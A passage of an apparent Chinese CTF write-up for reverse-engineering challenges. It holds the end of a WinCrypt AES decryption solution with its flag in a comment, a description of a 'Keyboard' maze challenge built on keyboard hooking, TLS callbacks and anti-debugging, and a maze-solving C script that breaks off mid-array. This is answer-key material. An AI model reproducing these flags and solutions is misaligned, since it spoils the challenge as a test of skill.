(hCryptKey)</span><br><span class="line">&#123;</span><br><span class="line">CryptDestroyKey(hCryptKey);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hCryptHash)</span><br><span class="line">&#123;</span><br><span class="line">CryptDestroyHash(hCryptHash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (hCryptProv)</span><br><span class="line">&#123;</span><br><span class="line">CryptReleaseContext(hCryptProv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bRet;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE Enc[] = &#123; <span class="number">0x35</span>,<span class="number">0xf8</span>,<span class="number">0x84</span>,<span class="number">0x29</span>,<span class="number">0x96</span>,<span class="number">0x4f</span>,<span class="number">0x82</span>,<span class="number">0x6b</span>,<span class="number">0x70</span>,<span class="number">0xfe</span>,<span class="number">0x3a</span>,<span class="number">0xff</span>,<span class="number">0x47</span>,<span class="number">0x2f</span>,<span class="number">0x43</span>,<span class="number">0x4b</span>,<span class="number">0x2c</span>,<span class="number">0x68</span>,<span class="number">0xbd</span>,<span class="number">0x16</span>,<span class="number">0x27</span>,<span class="number">0x30</span>,<span class="number">0x82</span>,<span class="number">0x50</span>,<span class="number">0xa9</span>,<span class="number">0x11</span>,<span class="number">0x99</span>,<span class="number">0xf1</span>,<span class="number">0xa0</span>,<span class="number">0x44</span>,<span class="number">0x20</span>,<span class="number">0xc2</span>,<span class="number">0x40</span>,<span class="number">0x18</span>,<span class="number">0x6f</span>,<span class="number">0x5d</span>,<span class="number">0x5b</span>,<span class="number">0xd8</span>,<span class="number">0x4d</span>,<span class="number">0x05</span>,<span class="number">0x44</span>,<span class="number">0x3c</span>,<span class="number">0xb5</span>,<span class="number">0xe7</span>,<span class="number">0x2e</span>,<span class="number">0x87</span>,<span class="number">0x79</span>,<span class="number">0xee</span> &#125;;</span><br><span class="line">BYTE Key[] = &#123; <span class="number">0x44</span>,<span class="number">0x4f</span>,<span class="number">0x8c</span>,<span class="number">0xdc</span>,<span class="number">0xbb</span>,<span class="number">0xb7</span>,<span class="number">0xcb</span>,<span class="number">0x47</span>,<span class="number">0x69</span>,<span class="number">0x3c</span>,<span class="number">0xa9</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,<span class="number">0x70</span>,<span class="number">0xbc</span>,<span class="number">0x40</span> &#125;;</span><br><span class="line"></span><br><span class="line">DWORD Enclen = <span class="number">0x30</span>;</span><br><span class="line">AesDecrypt(Key, <span class="number">16</span>, Enc, Enclen, MAX_PATH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Enclen; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, Enc[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//D0g3&#123;H@sh_a^d_Aes_6y_W1nCrypt!!&#125;</span></span><br></pre></td></tr></table></figure><p>这道题我是在给das四月赛出的题在进行了部分修改，看雪上还有一个hook的解法，感觉还不错，原理是钩取了CryptEncrypt，将其变为了CryptDecrypt，然后打印出解密后的字符串。</p><h3 id="Keyboard"><a href="#Keyboard" class="headerlink" title="Keyboard"></a>Keyboard</h3><p>题目难度：中</p><p>hint：注意题目名称，keyboard，keyboard，keyboard，重要的事情说3遍！！！</p><p>题目链接：链接：<a href="https://pan.baidu.com/s/10oHTA2tr1ztxnsLjHmIojQ">https://pan.baidu.com/s/10oHTA2tr1ztxnsLjHmIojQ</a>  提取码：abcd</p><p>题目文本：请将得到的字符串进行32位小写md5加密，然后加上D0g3{}</p><h4 id="考点：-1"><a href="#考点：-1" class="headerlink" title="考点："></a>考点：</h4><p>假流程，假的加密过程为一个rc4加密，真正的过程是一个线程，里面有键盘钩取，钩取wasd键，进行走迷宫，但有一个tls函数对于迷宫的行列进行了变换，而且对迷宫的一个值进行了修改，里面还有一个汇编写的IsDebugPrevent反调试，也是对列行进行初始化，是错误的引导。迷宫有多条路径，需要写脚本进行走迷宫，得到最短路径。</p><h4 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h4><p>得到正确的迷宫后，写出脚本</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>  <span class="built_in">map</span>[<span class="number">40</span>][<span class="number">40</span>] = &#123;</span><br><span class="line">&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, &#125;,</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span 